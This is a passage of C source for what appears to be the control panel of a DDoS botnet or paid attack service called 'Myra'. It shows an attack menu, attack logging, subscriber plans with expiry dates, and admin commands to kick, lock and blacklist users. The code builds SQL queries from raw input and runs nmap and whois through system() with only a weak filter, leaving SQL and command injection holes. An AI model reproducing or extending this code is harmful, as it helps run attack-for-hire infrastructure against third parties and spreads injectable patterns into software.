	_type[0] = toupper(_type[0]);

	if(count > 0)
	{
		asprintf(&buffer, "\e[38;5;79m║ \e[38;5;230m%s\e[38;5;204m: \e[38;5;230m%.2f\e[38;5;204m%\r\n", _type, count / counter * 100);
		send(fd, buffer, strlen(buffer), MSG_NOSIGNAL);
	}
	return count;
}

void get_popularity(MYSQL *conn, const int fd)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(atk[i].type) == 0)
			break;

		get_popularity_count(conn, fd, atk[i].type);
	}
}

void epoll_receive_login(const int fd, char *buffer)
{
	int ret, count = 0;
	char *noti;

	memset(buffer, 0, sizeof(buffer));
	while((ret = recv(fd, buffer, 99, MSG_NOSIGNAL)) <= 2)
	{
		count++;
		if(count == 2)
		{
			epoll_remove_active_client(fd);
			return;
		}
	}
	epoll_remove_newline(buffer);
}

void epoll_log_attack(MYSQL *conn, char *user, char *attack)
{
	char *command;

	asprintf(&command, "INSERT INTO attacks (id, attack, user) VALUES ('0', '%s', '%s')",
		attack, user);
	mysql_query(conn, command);
	free(command);
}

void epoll_remove_newline(char *buffer)
{
	int i;

	for(i = 0; i < strlen(buffer); i++)
	{
		if(buffer[i] == '\r' || buffer[i] == '\n')
			buffer[i] = 0;
	}
}

void epoll_send_chatprompt(const int fd, const char *user)
{
	send(fd, "\e[38;5;204m[\e[38;5;79m", strlen("\e[38;5;204m[\e[38;5;79m"), MSG_NOSIGNAL);
	send(fd, user, strlen(user), MSG_NOSIGNAL);
	send(fd, "\e[38;5;204m@\e[38;5;230mMyra-chatroom\e[38;5;204m]\e[38;5;154m$\e[38;5;230m ", 
		strlen("\e[38;5;204m@\e[38;5;230mMyra-chatroom\e[38;5;204m]\e[38;5;154m$\e[38;5;230m "), MSG_NOSIGNAL);
}

void epoll_blacklist_ip(const int fd)
{
	char buffer[100];
	int i;

	send(fd, "\e[38;5;230mWhich \e[38;5;204mIP \e[38;5;230mdo you want to \e[38;5;204mblacklist\e[38;5;230m?\e[38;5;204m: ", strlen("\e[38;5;230mWhich \e[38;5;204mIP \e[38;5;230mdo you want to \e[38;5;204mblacklist\e[38;5;230m?\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	epoll_remove_newline(buffer);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(blacklist[i].addr) == 0)
		{
			strcpy(blacklist[i].addr, buffer);
			return;
		}
	}
}

void epoll_unblacklist_ip(const int fd)
{
	char buffer[100];
	int i;

	send(fd, "\e[38;5;230mWhich \e[38;5;204mIP \e[38;5;230mdo you want to \e[38;5;204munblacklist\e[38;5;230m?\e[38;5;204m: ", strlen("\e[38;5;230mWhich \e[38;5;204mIP \e[38;5;230mdo you want to \e[38;5;204munblacklist\e[38;5;230m?\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	epoll_remove_newline(buffer);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(blacklist[i].addr, buffer) == 0)
		{
			memset(blacklist[i].addr, 0, sizeof(blacklist[i].addr));
			return;
		}
	}
}

void epoll_kick_user(int line, const int fd)
{
	char buffer[100];
	int i;

	epoll_get_online_users(line, fd);
	send(fd, "\e[38;5;230mWho do you want to \e[38;5;204mkick\e[38;5;230m?\e[38;5;204m: ", strlen("\e[38;5;230mWho do you want to \e[38;5;204mkick\e[38;5;230m?\e[38;5;204m: "), MSG_NOSIGNAL);
	memset(buffer, 0, sizeof(buffer));
	epoll_receive_login(fd, buffer);
	epoll_remove_newline(buffer);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(user[i].name, buffer) == 0)
		{
			if(strcmp(user[fd].username, user[i].name) == 0)
			{
				send(fd, "\e[38;5;230mYou cannot \e[38;5;204mkick yourself\e[38;5;230m.\r\n", strlen("\e[38;5;230mYou cannot \e[38;5;204mkick yourself\e[38;5;230m.\r\n"), MSG_NOSIGNAL);
				return;
			}

			send(fd, "\e[38;5;230mSuccesfully \e[38;5;204mkicked \e[38;5;230muser\e[38;5;204m: ", strlen("\e[38;5;230mSuccesfully \e[38;5;204mkicked \e[38;5;230muser\e[38;5;204m: "), MSG_NOSIGNAL);
			send(fd, user[i].name, strlen(user[i].name), MSG_NOSIGNAL);
			send(fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);

			send(user[i].fd, "\r\nYou have been kicked by ", 
				strlen("\r\nYou have been kicked by "), MSG_NOSIGNAL);
			send(user[i].fd, db[line].user, strlen(db[line].user), MSG_NOSIGNAL);
			send(user[i].fd, "\r\n", 2, MSG_NOSIGNAL);

			sleep(2);
			epoll_remove_active_client(user[i].fd);
			return;
		}
	}
}

void epoll_print_banner(const int fd)
{
	int i;

	for(i = 0; i < sizeof(_banner) / sizeof(_banner[0]); i++)
		send(fd, _banner[i], strlen(_banner[i]), MSG_NOSIGNAL);
}

void epoll_send_chat(const char *_user, const int fd, const char *rdbuf)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(fd == user[i].fd)
			continue;

		if(user[i].fd > 0 && user[i].chat_enabled == 1)
		{
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			send(user[i].fd, _user, strlen(_user), MSG_NOSIGNAL);
			send(user[i].fd, ": ", 2, MSG_NOSIGNAL);
			send(user[i].fd, rdbuf, strlen(rdbuf), MSG_NOSIGNAL);
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			epoll_send_chatprompt(user[i].fd, user[i].name);
		}
	}
}

void epoll_add_user(MYSQL *con, const int fd)
{
	char day[3], month[3], year[5];
	char buffer[100], username[100], password[100], type[100], *query;

	send(fd, "\e[38;5;230mUsername\e[38;5;204m: ", strlen("\e[38;5;230mUsername\e[38;5;204m: "), MSG_NOSIGNAL);
	fdgets(fd, username, sizeof(username));
	send(fd, "\e[38;5;230mPassword\e[38;5;204m: ", strlen("\e[38;5;230mPassword\e[38;5;204m: "), MSG_NOSIGNAL);
	fdgets(fd, password, sizeof(username));
	_encrypt(password);
	send(fd, "\e[38;5;230mType\e[38;5;204m: ", strlen("\e[38;5;230mType\e[38;5;204m: "), MSG_NOSIGNAL);
	fdgets(fd, type, sizeof(username));
	send(fd, "\e[38;5;230mExpiring Date Details.\r\n", strlen("\e[38;5;230mExpiring Date Details.\r\n"), MSG_NOSIGNAL);
	send(fd, "\e[38;5;230mDay\e[38;5;204m: ", strlen("\e[38;5;230mDay\e[38;5;204m: "), MSG_NOSIGNAL);
	fdgets(fd, day, sizeof(username));
	send(fd, "\e[38;5;230mMonth\e[38;5;204m: ", strlen("\e[38;5;230mMonth\e[38;5;204m: "), MSG_NOSIGNAL);
	fdgets(fd, month, sizeof(username));
	send(fd, "\e[38;5;230mYear\e[38;5;204m: ", strlen("\e[38;5;230mYear\e[38;5;204m: "), MSG_NOSIGNAL);
	fdgets(fd, year, sizeof(username));

	asprintf(&query, "INSERT INTO users (id, username, password, plan, expirydate) VALUES ('0', '%s', '%s', '%s', '%s/%s/%s')",
		username, escape_string(encstr), type, day, month, year);

	mysql_query(con, query);
	free(query);

	send(fd, SCREENCLEAR, strlen(SCREENCLEAR), MSG_NOSIGNAL);
}

void attack_menu(const int fd)
{
	int i;
	for(i = 0; i < sizeof(_attack_menu) / sizeof(_attack_menu[0]); i++)
		send(fd, _attack_menu[i], strlen(_attack_menu[i]), MSG_NOSIGNAL);
}

void epoll_freeze_user(const int fd, const char *rdbuf)
{
	
}

void epoll_nmap_user(const int fd)
{
	int rfd, i, index = 0;
	char buffer[8096], command[8096], rdbuf[8096], *file;

	send(fd, "\e[38;5;230mIP\e[38;5;204m: ", strlen("\e[38;5;230mIP\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	epoll_remove_newline(buffer);

	srand(time(0));
	asprintf(&file, "nmap%d", rand() % 65535);

	if(find_exploit(fd, buffer))
		return;

	strcpy(command, "nmap ");
	strcat(command, buffer);
	strcat(command, "> ");
	strcat(command, file);
	system(command);

	rfd = open(file, O_RDONLY);
	read(rfd, buffer, sizeof(buffer));
	close(rfd);
	unlink(file);
	free(file);

	for(i = 0; i < strlen(buffer); i++)
	{
		if(buffer[i] == '\n')
		{
			rdbuf[index] = '\r';
			index++;
		}
		rdbuf[index] = buffer[i];
		index++;
	}

	send(fd, rdbuf, strlen(rdbuf), MSG_NOSIGNAL);
}

int find_exploit(int fd, char *buffer)
{
	char *noti, index = 0, i, x;
	char wrbuf[strlen(buffer) + 1];

	for(i = 0; i < strlen(buffer); i++)
	{
		if(buffer[i] == '.' || buffer[i] == '-')
			continue;

		if(ispunct(buffer[i]))
		{
			for(x = 0; x < strlen(buffer); x++)
			{
				if(buffer[x] == '@')
				{
					wrbuf[index] = '@';
					wrbuf[index + 1] = ' ';
					index += 2;
					continue;
				}
				wrbuf[index] = buffer[x];
				index++;
			}

			asprintf(&noti, "> **Myra Exploit Notification**!\n> **FD**: %d\n> **Username**: %s\n> **Tried to exploit using**: %s", 
				fd, user[fd].username, wrbuf);
			send_webhook(noti);
			free(noti);
			return 1;		
		}
	}

	return 0;
}

void epoll_whois_user(const int fd)
{
	int rfd, i, index = 0;
	char buffer[8096], command[8096], rdbuf[8096], *file;

	send(fd, "\e[38;5;230mAddress\e[38;5;204m: ", strlen("\e[38;5;230mAddress\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	epoll_remove_newline(buffer);

	srand(time(0));
	asprintf(&file, "whois%d", rand() % 65535);

	if(find_exploit(fd, buffer))
		return;

	strcpy(command, "whois ");
	strcat(command, buffer);
	strcat(command, "> ");
	strcat(command, file);
	system(command);

	rfd = open(file, O_RDONLY);
	read(rfd, buffer, sizeof(buffer));
	close(rfd);
	unlink(file);
	free(file);

	for(i = 0; i < strlen(buffer); i++)
	{
		if(buffer[i] == '\n')
		{
			rdbuf[index] = '\r';
			index++;
		}
		rdbuf[index] = buffer[i];
		index++;
	}

	send(fd, rdbuf, strlen(rdbuf), MSG_NOSIGNAL);
}

char *get_os()
{
	char buffer[100];
	int pass_through = 0, index = 0, i;
	char *os_system = calloc(1, sizeof(char));

	int fd;

	system("cat /etc/os-release | grep PRETTY_NAME > file.txt");
	fd = open("file.txt", O_RDONLY);
	read(fd, buffer, sizeof(buffer));

	for(i = 0; i < strlen(buffer); i++)
	{
		if(pass_through == 2)
			break;

		if(pass_through == 1)
		{
			os_system = realloc(os_system, index + 1);
			os_system[index] = buffer[i];
			index++;
		}

		if(buffer[i] == '"')
			pass_through++;
	}

	os_system[strlen(os_system) - 1] = 0;
	return os_system;
}

void epoll_lock_user(const int fd, const char *rdbuf)
{
	char buffer[100], message[1024];
	int i;

	send(fd, "\e[38;5;230mUsername\e[38;5;204m: ", strlen("\e[38;5;230mUsername\e[38;5;204m: "), MSG_NOSIGNAL);
	recv(fd, buffer, sizeof(buffer), MSG_NOSIGNAL);
	send(fd, "\e[38;5;230mMessage\e[38;5;204m: ", strlen("\e[38;5;230mMessage\e[38;5;204m: "), MSG_NOSIGNAL);
	recv(fd, message, sizeof(message), MSG_NOSIGNAL);
	epoll_remove_newline(buffer);

	if(strcmp(user[fd].name, buffer) == 0)
	{
		send(fd, "\e[38;5;230mYou cannot \e[38;5;204mlock \e[38;5;230myourself\e[38;5;79m.\r\n", strlen("\e[38;5;230mYou cannot \e[38;5;204mlock \e[38;5;230myourself\e[38;5;79m.\r\n"), MSG_NOSIGNAL);
		return;
	}

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(user[i].name) == 0)
			continue;

		if(strcmp(user[i].name, buffer) == 0)
		{
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			send(user[i].fd, "\e[38;5;79m[\e[38;5;204mAdmin-Message\e[38;5;79m]\e[38;5;204m: ", strlen("\e[38;5;79m[\e[38;5;204mAdmin-Message\e[38;5;79m]\e[38;5;204m: "), MSG_NOSIGNAL);
			send(user[i].fd, user[fd].name, strlen(user[fd].name), MSG_NOSIGNAL);
			send(user[i].fd, " \e[38;5;230mLocked you out of \e[38;5;204mMyra\e[38;5;79m. ", strlen(" \e[38;5;230mLocked you out of \e[38;5;204mMyra\e[38;5;79m. "), MSG_NOSIGNAL);
			send(user[i].fd, message, strlen(message), MSG_NOSIGNAL);
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			user[i].locked = 1;
			return;
		}
	}
}

void epoll_unlock_user(const int fd, const char *rdbuf)
{
	char buffer[100], message[1024];
	int i;

	send(fd, "\e[38;5;230mUsername\e[38;5;204m: ", strlen("\e[38;5;230mUsername\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	send(fd, "\e[38;5;230mMessage\e[38;5;204m: ", strlen("\e[38;5;230mMessage\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, message);

	if(strcmp(user[fd].name, buffer) == 0)
	{
		send(fd, "\e[38;5;230mYou cannot \e[38;5;204mlock \e[38;5;230myourself\e[38;5;79m.\r\n", strlen("\e[38;5;230mYou cannot \e[38;5;204mlock \e[38;5;230myourself\e[38;5;79m.\r\n"), MSG_NOSIGNAL);
		return;
	}

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(user[i].name) == 0)
			continue;

		if(strcmp(user[i].name, buffer) == 0)
		{
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			send(user[i].fd, "\e[38;5;79m[\e[38;5;204mAdmin-Message\e[38;5;79m]\e[38;5;204m: ", strlen("\e[38;5;79m[\e[38;5;204mAdmin-Message\e[38;5;79m]\e[38;5;204m: "), MSG_NOSIGNAL);
			send(user[i].fd, user[fd].name, strlen(user[fd].name), MSG_NOSIGNAL);
			send(user[i].fd, " \e[38;5;230mUnlocked your \e[38;5;204maccount\e[38;5;230m. ", strlen(" \e[38;5;230mUnlocked your \e[38;5;204maccount\e[38;5;230m. "), MSG_NOSIGNAL);
			send(user[i].fd, message, strlen(message), MSG_NOSIGNAL);
			send(user[i].fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
			user[i].locked = 0;
			return;
		}
	}
}

void epoll_unblacklist_ip_attack(MYSQL *conn, const int fd)
{
	int i;
	char *rmstr, buffer[100];

	send(fd, "\e[38;5;230mIP\e[38;5;204m: ", strlen("\e[38;5;230mIP\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	asprintf(&rmstr, "DELETE FROM blacklisted WHERE address = '%s'", buffer);
	mysql_query(conn, rmstr);
	free(rmstr);
}

void epoll_remove_user(MYSQL *conn, const int fd)
{
	int i;
	char *rmstr, buffer[100];

	send(fd, "\e[38;5;230mUsername\e[38;5;204m: ", strlen("\e[38;5;230mUsername\e[38;5;204m: "), MSG_NOSIGNAL);
	epoll_receive_login(fd, buffer);
	asprintf(&rmstr, "DELETE FROM users WHERE username = '%s'", buffer);
	mysql_query(conn, rmstr);
	free(rmstr);

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strcmp(buffer, user[i].name) == 0)
		{
			send(user[i].fd, "\r\n\e[38;5;230mYour \e[38;5;204muser \e[38;5;230mhas been \e[38;5;204mdeleted\e[38;5;230m.\r\n", 
				strlen("\r\n\e[38;5;230mYour \e[38;5;204muser \e[38;5;230mhas been \e[38;5;204mdeleted\e[38;5;230m.\r\n"), MSG_NOSIGNAL);

			sleep(2);
			epoll_remove_active_client(user[i].fd);
			return;
		}
	}
}
